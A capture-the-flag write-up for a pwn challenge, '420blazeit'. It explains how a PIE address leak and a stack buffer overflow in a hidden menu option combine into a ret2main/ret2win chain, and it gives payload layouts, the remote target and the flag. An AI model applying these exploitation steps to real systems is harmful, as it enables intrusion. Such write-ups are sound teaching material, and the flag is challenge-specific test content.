# 420blazeit (mIg)

**Points:** 495  
**Category:** Binary Exploitation (Pwn)  
**Target:** `nc 134.209.144.148 7834`  
**File:** `chall` (64-bit x86-64 stripped ELF)

## Flag

```text
cruXipher{mIg_n0_$C0p3_G3t_rek7_m8}
```

## Challenge

A stripped 64-bit Linux ELF executable with a hidden menu option and stack buffer overflow vulnerability.

## Security Mitigations

```text
Arch:     amd64-64-little (ELF 64-bit LSB pie executable)
RELRO:    Full RELRO (BIND_NOW)
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
```

**Key takeaways:**
- **No Stack Canary:** Stack buffer overflows can directly overwrite saved RIP
- **PIE Enabled:** Need a code-pointer leak to compute `pie_base`
- **Full RELRO & NX:** Favors ROP / `ret2win` chain

## Reverse Engineering

Key functions identified:

| Offset | Function | Summary |
| :--- | :--- | :--- |
| `0x164b` | `main` | Increments `*(uint32_t *)(pie + 0x4058)`, calls `0x1567`, enters infinite menu loop |
| `0x12a9` | `menu` | Prints options `1..5`, checks hidden option `420` (`0x1a4`) |
| `0x1387` | `doge` (Option `2`) | One-time prompt that leaks its own runtime address (`0x1387`) via `printf("%p")` |
| `0x1567` | `check_quickscope` | Checks if `*(uint32_t *)(pie + 0x4058) > 1` |
| `0x158c` | `win` | Opens and prints `flag.txt`, **only if** `*(uint32_t *)(pie + 0x4058) > 1` |

## Vulnerabilities

### Vulnerability 1: PIE Address Leak in Option `2`

When `*(uint32_t *)(pie + 0x4010) == 1`, selecting menu option `2` and answering `no` then `yes` leaks the runtime address of `0x1387`:

```text
pie_base = leaked_ptr - 0x1387
```

### Vulnerability 2: Stack Buffer Overflow in Hidden Option `420`

Hidden menu option `420` reads up to `0x80` (128) bytes into a `0x20` (32)-byte stack buffer:

```text
+---------------------------+  <- rbp - 0x20
|  buffer (32 bytes)        |
+---------------------------+  <- rbp
|  saved RBP (8 bytes)      |
+---------------------------+  <- rbp + 0x08 (offset 0x28 = 40 bytes)
|  saved RIP (return addr)  |
+---------------------------+
```

### Gate Check in `win`

The `win` function verifies that the global counter at `pie + 0x4058` is strictly greater than `1`. On initial startup, `main` increments it from `0` to `1`. Calling `main` a second time increments it to `2`, satisfying the condition.

## Exploitation Walkthrough

1. **Leak `pie_base`:**
   - Send menu choice `2`
   - Answer `no` to `"do u love doge?"` and `yes` to `"kil doge?"`
   - Parse leaked pointer and compute addresses:
     - `pie_base = leak - 0x1387`
     - `ret_gadget = pie_base + 0x101a` (for stack alignment)
     - `main_addr = pie_base + 0x164b`
     - `win_addr = pie_base + 0x158c`

2. **Stage 1 Overflow (`ret2main`):**
   - Send hidden menu choice `420`
   - Send payload: `b"A" * 0x28 + p64(ret_gadget) + p64(main_addr)`
   - `menu` returns into `main`, incrementing counter to `2`

3. **Stage 2 Overflow (`ret2win`):**
   - Send hidden menu choice `420` again
   - Send payload: `b"A" * 0x28 + p64(ret_gadget) + p64(win_addr)`
   - `win` checks `counter > 1` (passes), opens and prints flag

## Solution

See the full exploit script (`solve.py`) in the repository.

### Usage

```bash
python3 solve.py
```

### Output

```text
[+] Leaked doge() = 0x...
[+] PIE base      = 0x...
[Stage 1] ret2main to increment counter...
[Stage 2] ret2win to get flag...
cruXipher{mIg_n0_$C0p3_G3t_rek7_m8}
```
